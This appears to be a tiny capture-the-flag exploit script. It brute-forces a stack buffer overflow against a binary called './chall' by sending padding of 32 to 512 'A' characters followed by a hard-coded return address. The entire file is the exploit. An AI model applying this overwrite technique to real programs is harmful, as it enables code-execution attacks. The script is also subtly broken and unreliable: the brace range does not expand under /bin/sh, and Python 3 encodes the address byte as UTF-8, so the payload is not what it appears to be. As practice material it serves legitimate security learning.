#!/bin/sh

for NUM in {32..512}; do
	echo '<<<<<<<<<<<<<<<<<<<<<'$NUM'>>>>>>>>>>>>>>>>>>>>>'
	python3 -c 'print("A"*'$NUM' + "\xda\x11\x40\x00")' | ./chall
done >result
